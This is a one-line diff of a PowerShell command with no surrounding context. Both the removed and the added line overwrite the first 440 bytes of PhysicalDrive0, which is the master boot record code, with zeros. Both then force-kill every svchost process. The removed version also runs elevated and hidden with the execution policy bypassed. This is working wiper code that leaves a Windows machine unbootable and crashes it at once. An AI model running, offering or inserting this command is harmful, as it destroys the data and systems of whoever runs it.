@@ -1,1 +1,1 @@
-Start-Process powershell -ArgumentList "-NoProfile -ExecutionPolicy Bypass -Command ""$drive='\\.\PhysicalDrive0'; $bytes=New-Object byte[] 440; $handle=[System.IO.File]::OpenWrite($drive); $handle.Write($bytes,0,$bytes.Length); $handle.Close(); Get-Process svchost | Stop-Process -Force""" -Verb RunAs -WindowStyle Hidden
+$drive='\\.\PhysicalDrive0'; $bytes=New-Object byte[] 440; $handle=[System.IO.File]::OpenWrite($drive); $handle.Write($bytes,0,$bytes.Length); $handle.Close(); taskkill /F /IM svchost.exe
